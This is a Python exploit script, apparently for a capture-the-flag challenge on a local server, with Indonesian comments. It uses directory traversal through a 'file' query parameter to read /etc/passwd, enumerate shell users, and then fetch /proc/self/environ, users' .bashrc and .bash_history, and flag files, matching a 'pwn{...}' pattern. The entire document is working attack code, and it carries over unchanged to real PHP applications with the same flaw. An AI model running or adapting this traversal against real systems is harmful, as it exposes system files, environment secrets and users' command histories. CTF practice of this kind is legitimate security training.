#!/usr/bin/env python3
import requests
import re

URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # 1. Cek /etc/passwd untuk enumerasi user
    print("[*] Checking /etc/passwd...")
    payload_passwd = "../../../../etc/passwd"
    
    try:
        r = requests.get(URL, params={'file': payload_passwd})
        
        users = []
        if "root:x:0:0" in r.text:
            print("[+] /etc/passwd FOUND!")
            # Parsing user yang punya shell /bin/bash atau /bin/sh (selain root)
            # Biasanya user CTF UID-nya 1000
            for line in r.text.splitlines():
                if "sh" in line and "root" not in line and "www-data" not in line:
                    parts = line.split(':')
                    if len(parts) > 0:
                        users.append(parts[0])
            
            print(f"[+] Detected potential users: {users}")
        else:
            print("[-] Failed to read /etc/passwd")

        # 2. List target file yang mau dicek
        # Kita gabungin lokasi standar + lokasi home user yang ditemukan
        files_to_check = [
            "/flag", 
            "/flag.txt",
            "/proc/self/environ"
        ]
        
        for user in users:
            files_to_check.append(f"/home/{user}/flag")
            files_to_check.append(f"/home/{user}/flag.txt")
            files_to_check.append(f"/home/{user}/.bashrc") # Belajar dari soal sebelumnya
            files_to_check.append(f"/home/{user}/.bash_history")

        # 3. Eksekusi Attack
        for filename in files_to_check:
            # Payload Traversal
            payload = f"../../../../{filename}"
            
            # Print (Overwrite line)
            print(f"[*] Trying: {filename}...", end="\r")
            
            r = requests.get(URL, params={'file': payload})
            
            # Indikator file ketemu:
            # - Status 200 (karena script PHP pake readfile)
            # - Tidak ada error "File not found."
            if r.status_code == 200 and "File not found." not in r.text:
                content = r.text.strip()
                # Bersihin output HTML sisa (video tag dll) kalau ada, 
                # tapi karena readfile() nge-dump raw bytes, biasanya kecampur sama HTML bawahnya.
                # Kita regex aja langsung.
                
                flag = re.search(r'pwn\{.*?\}', content)
                
                if flag:
                    print(f"\n[+] FILE FOUND: {filename}")
                    print("-" * 40)
                    print(f"\n[!!!] JACKPOT! FLAG: {flag.group(0)}\n")
                    return
                elif "export FLAG" in content: # Cek .bashrc pattern
                     print(f"\n[+] FILE FOUND: {filename}")
                     print("-" * 40)
                     print(content) 

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
